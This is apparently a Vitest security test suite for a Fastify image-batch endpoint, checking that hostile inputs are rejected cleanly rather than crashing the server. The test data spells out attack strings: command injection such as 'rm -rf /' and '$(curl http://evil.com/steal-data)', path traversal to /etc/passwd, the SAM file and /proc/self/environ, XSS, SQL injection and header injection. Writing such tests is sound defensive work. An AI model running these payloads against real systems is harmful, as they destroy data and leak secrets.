import { test, expect, describe, beforeAll, afterAll } from 'vitest';
import { build, expectValidResponse } from '../helpers/test-helper';
import type { FastifyInstance } from 'fastify';

describe('🚨 Input Validation Attack Vectors', () => {
  let app: FastifyInstance;
  
  beforeAll(async () => {
    app = await build();
  });
  
  afterAll(async () => {
    await app.close();
  });

  describe('💀 Malicious Prompt Injection Attacks', () => {
    const maliciousPrompts = [
      // Command injection attempts
      '"; rm -rf /; "',
      '$(curl http://evil.com/steal-data)',
      '`whoami`',
      '${process.env.SECRET}',
      
      // Path traversal attempts
      '../../../etc/passwd',
      '..\\..\\windows\\system32\\config\\sam',
      '/proc/self/environ',
      
      // Script injection
      '<script>alert("xss")</script>',
      'javascript:alert(1)',
      'data:text/html,<script>alert(1)</script>',
      
      // SQL injection patterns (even though we don't use SQL)
      "'; DROP TABLE users; --",
      "1' OR '1'='1",
      "UNION SELECT * FROM information_schema.tables--",
      
      // Binary and control characters
      '\x00\x01\x02\x03\x04\x05',
      '\u0000\uFFFE\uFFFF',
      String.fromCharCode(0, 1, 2, 3, 4, 5),
      
      // Unicode exploits
      '™️🔥💀\u0000\uFFFE',
      '\u202e\u202d', // Right-to-left override
      '\uFEFF', // Zero-width no-break space
      
      // Extremely long inputs
      'A'.repeat(100000),
      'A'.repeat(1000000), // 1MB string
      'Unicode: ' + '🚀'.repeat(50000),
      
      // JSON bombs
      '{"a":'.repeat(1000) + '"value"' + '}'.repeat(1000),
      
      // Null byte injection
      'prompt\x00hidden',
      'normal_text\0/etc/passwd',
    ];

    maliciousPrompts.forEach((maliciousPrompt, index) => {
      test(`Malicious prompt ${index + 1}: ${maliciousPrompt.slice(0, 50)}...`, async () => {
        const response = await app.inject({
          method: 'POST',
          url: '/batch/images',
          headers: {
            'content-type': 'application/json'
          },
          payload: {
            items: [{
              scene_id: `attack-${index}`,
              prompt: maliciousPrompt,
              variants: 1
            }],
            runMode: 'dry_run'
          }
        });
        
        // Should not crash or return 500
        expect(response.statusCode).not.toBe(500);
        
        // Should either accept (with sanitization) or reject cleanly
        if (response.statusCode === 200) {
          expectValidResponse(response);
        } else {
          // If rejected, should be a clean 400 error
          expect(response.statusCode).toBe(400);
          const error = response.json();
          expect(error.error).toBeDefined();
          expect(error.message).toBeDefined();
        }
      });
    });
  });

  describe('🎭 Schema Manipulation Attacks', () => {
    const invalidPayloads = [
      // Missing required fields
      { items: [] },
      { runMode: 'live' },
      { items: [{ scene_id: 'test' }] }, // missing prompt, variants
      
      // Wrong data types
      { items: 'not-an-array', runMode: 'live' },
      { items: [{ scene_id: 123, prompt: 'test', variants: 1 }], runMode: 'live' },
      { items: [{ scene_id: 'test', prompt: [], variants: 1 }], runMode: 'live' },
      { items: [{ scene_id: 'test', prompt: 'test', variants: 'not-number' }], runMode: 'live' },
      
      // Out of range values
      { items: [{ scene_id: 'test', prompt: 'test', variants: -1 }], runMode: 'live' },
      { items: [{ scene_id: 'test', prompt: 'test', variants: 999999 }], runMode: 'live' },
      { items: [{ scene_id: 'test', prompt: 'test', variants: 0 }], runMode: 'live' },
      
      // Invalid enum values
      { items: [{ scene_id: 'test', prompt: 'test', variants: 1 }], runMode: 'invalid' },
      { items: [{ scene_id: 'test', prompt: 'test', variants: 1 }], runMode: null },
      
      // Circular references (will be caught by JSON.stringify)
      (() => {
        const obj: any = { items: [{ scene_id: 'test', prompt: 'test', variants: 1 }], runMode: 'live' };
        obj.self = obj;
        return obj;
      })(),
      
      // Deeply nested objects
      {
        items: [{
          scene_id: 'test',
          prompt: 'test',
          variants: 1,
          nested: Array(100).fill(0).reduce((acc, _, i) => ({ [i]: acc }), {})
        }],
        runMode: 'live'
      },
      
      // Array instead of object
      ['not', 'an', 'object'],
      
      // Null/undefined
      null,
      undefined,
    ];

    invalidPayloads.forEach((payload, index) => {
      let payloadDescription;
      try {
        payloadDescription = JSON.stringify(payload)?.slice(0, 100);
      } catch (error) {
        payloadDescription = `[Circular object]`;
      }
      test(`Invalid payload ${index + 1}: ${payloadDescription}...`, async () => {
        let response;
        try {
          response = await app.inject({
            method: 'POST',
            url: '/batch/images',
            headers: {
              'content-type': 'application/json'
            },
            payload: payload
          });
        } catch (error) {
          // If JSON serialization fails, that's actually good
          expect(error).toBeDefined();
          return;
        }
        
        // Should reject with 400, not crash with 500
        expect(response.statusCode).not.toBe(500);
        expect([400, 422]).toContain(response.statusCode);
        
        const error = response.json();
        expect(error.error).toBeDefined();
        expect(error.message).toBeDefined();
      });
    });
  });

  describe('🌊 JSON Flood Attacks', () => {
    test('Extremely large JSON payload', async () => {
      const largeArray = Array(1000).fill(0).map((_, i) => ({
        scene_id: `flood-${i}`,
        prompt: 'A'.repeat(1000),
        variants: 3
      }));
      
      const response = await app.inject({
        method: 'POST',
        url: '/batch/images',
        headers: {
          'content-type': 'application/json'
        },
        payload: {
          items: largeArray,
          runMode: 'dry_run'
        }
      });
      
      // Should reject large batches cleanly, not crash
      expect(response.statusCode).not.toBe(500);
      expect([400, 413]).toContain(response.statusCode);
    });
    
    test('JSON with extremely long strings', async () => {
      const response = await app.inject({
        method: 'POST',
        url: '/batch/images',
        headers: {
          'content-type': 'application/json'
        },
        payload: {
          items: [{
            scene_id: 'X'.repeat(100000),
            prompt: 'Y'.repeat(1000000),
            variants: 1
          }],
          runMode: 'dry_run'
        }
      });
      
      expect(response.statusCode).not.toBe(500);
    });
  });

  describe('🔧 Content-Type Manipulation', () => {
    test('Invalid content-type header', async () => {
      const response = await app.inject({
        method: 'POST',
        url: '/batch/images',
        headers: {
          'content-type': 'text/plain'
        },
        payload: JSON.stringify({
          items: [{ scene_id: 'test', prompt: 'test', variants: 1 }],
          runMode: 'dry_run'
        })
      });
      
      expect(response.statusCode).not.toBe(500);
      expect([400, 415]).toContain(response.statusCode);
    });
    
    test('Missing content-type header', async () => {
      const response = await app.inject({
        method: 'POST',
        url: '/batch/images',
        payload: JSON.stringify({
          items: [{ scene_id: 'test', prompt: 'test', variants: 1 }],
          runMode: 'dry_run'
        })
      });
      
      expect(response.statusCode).not.toBe(500);
    });
    
    test('Malformed JSON', async () => {
      const response = await app.inject({
        method: 'POST',
        url: '/batch/images',
        headers: {
          'content-type': 'application/json'
        },
        payload: '{"invalid": json malformed'
      });
      
      expect(response.statusCode).not.toBe(500);
      expect(response.statusCode).toBe(400);
    });
  });

  describe('🎪 Edge Case Scene IDs', () => {
    const edgeCaseSceneIds = [
      '', // empty string
      ' ', // single space
      '\t\n\r', // whitespace chars
      '.', // single dot
      '..', // double dot (path traversal)
      '/', // forward slash
      '\\', // backslash
      '/etc/passwd', // absolute path
      '../secrets', // relative path
      'normal-scene-id\x00hidden', // null byte
      '🚀🔥💀', // emojis
      'ä£€¢', // special chars
      'scene'.repeat(1000), // very long
      String.fromCharCode(...Array(255).keys()), // all ASCII chars
    ];

    edgeCaseSceneIds.forEach((sceneId, index) => {
      test(`Edge case scene_id ${index + 1}: "${sceneId.slice(0, 20)}..."`, async () => {
        const response = await app.inject({
          method: 'POST',
          url: '/batch/images',
          headers: {
            'content-type': 'application/json'
          },
          payload: {
            items: [{
              scene_id: sceneId,
              prompt: 'test prompt',
              variants: 1
            }],
            runMode: 'dry_run'
          }
        });
        
        // Should handle gracefully, not crash
        expect(response.statusCode).not.toBe(500);
        
        if (response.statusCode === 200) {
          expectValidResponse(response);
        } else {
          // Clean rejection
          expect(response.statusCode).toBe(400);
          const error = response.json();
          expect(error.error).toBeDefined();
        }
      });
    });
  });

  describe('🎯 Headers Injection Attacks', () => {
    const maliciousHeaders = [
      { 'x-forwarded-for': '127.0.0.1; rm -rf /' },
      { 'user-agent': '<script>alert(1)</script>' },
      { 'authorization': 'Bearer ../../../etc/passwd' },
      { 'x-real-ip': '$(curl evil.com)' },
      { 'accept': '*/*; rm -rf /' },
      { 'x-custom': '\x00\x01\x02\x03' },
      { 'cookie': 'session="; rm -rf /"' },
    ];

    maliciousHeaders.forEach((headers, index) => {
      test(`Malicious headers ${index + 1}: ${JSON.stringify(headers)}`, async () => {
        const response = await app.inject({
          method: 'POST',
          url: '/batch/images',
          headers: {
            'content-type': 'application/json',
            ...headers
          },
          payload: {
            items: [{ scene_id: 'test', prompt: 'test', variants: 1 }],
            runMode: 'dry_run'
          }
        });
        
        // Should not crash from header injection
        expect(response.statusCode).not.toBe(500);
      });
    });
  });
});